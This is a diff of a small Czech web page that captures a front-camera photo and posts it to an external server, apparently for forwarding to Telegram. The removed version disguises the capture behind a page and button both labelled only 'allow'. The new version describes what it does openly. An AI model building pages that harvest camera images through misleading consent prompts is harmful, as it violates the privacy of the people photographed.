@@ -1,40 +1,66 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>allow</title>
+  <title>Pořiď fotku z kamery</title>
+  <style>
+    body { font-family: sans-serif; text-align: center; margin: 2em; }
+    video, canvas { max-width: 100%; }
+    #result { margin-top: 1em; }
+    button { padding: 1em 2em; font-size: 1.1em; }
+  </style>
 </head>
 <body>
-  <video id="video" width="300" height="520" autoplay playsinline></video>
-  <button id="snap">allow</button>
-  <canvas id="canvas" width="3" height="2" style="display:none;"></canvas>
+  <h2>Pořiď fotku z kamery a odešli do Telegramu</h2>
+  <video id="video" autoplay playsinline></video><br>
+  <button id="snap">Pořiď fotku</button>
+  <br>
+  <canvas id="canvas" style="display:none;"></canvas>
+  <div id="result"></div>
   <script>
-    navigator.mediaDevices.getUserMedia({
-      video: { facingMode: "user" }
-    })
-    .then(stream => {
-      document.getElementById('video').srcObject = stream;
-    })
-    .catch(error => {
-      alert("Kamera nebyla povolena nebo nastala chyba: " + error);
-    });
+    // Nastavení kamery
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const snap = document.getElementById('snap');
+    const result = document.getElementById('result');
 
-    document.getElementById('snap').onclick = function() {
-      const video = document.getElementById('video');
-      const canvas = document.getElementById('canvas');
-      const context = canvas.getContext('2d');
-      context.drawImage(video, 0, 0, canvas.width, canvas.height);
+    // Spusť kameru po načtení
+    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+      navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+        .then(function(stream) {
+          video.srcObject = stream;
+          video.play();
+        })
+        .catch(function(err) {
+          result.innerHTML = "Chyba: Kamera není povolená nebo není dostupná.";
+        });
+    } else {
+      result.innerHTML = "Tento prohlížeč nepodporuje kameru.";
+    }
 
-      const dataUrl = canvas.toDataURL('image/png');
+    // Po kliknutí na tlačítko
+    snap.onclick = function() {
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      canvas.getContext('2d').drawImage(video, 0, 0);
+      canvas.style.display = 'block';
 
-      // ODESÍLÁNÍ NA TVŮJ SERVER NA PYTHONANYWHERE
+      // Vytvoř base64 obrázek
+      const dataUrl = canvas.toDataURL('image/jpeg');
+
+      // Odeslat na server
       fetch('https://lixo.pythonanywhere.com/upload', {
         method: 'POST',
-        body: JSON.stringify({ image: dataUrl }),
-        headers: { 'Content-Type': 'application/json' }
-      }).then(res => res.json()).then(data => {
-        alert('Fotka byla odeslána a měla by přijít do Telegramu!');
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ image: dataUrl })
+      })
+      .then(response => response.text())
+      .then(res => {
+        result.innerHTML = "Fotka odeslána!<br>Pokud přijde do Telegramu, vše je OK.";
+      })
+      .catch(err => {
+        result.innerHTML = "Chyba při odesílání fotky: " + err;
       });
-    }
+    };
   </script>
 </body>
 </html>
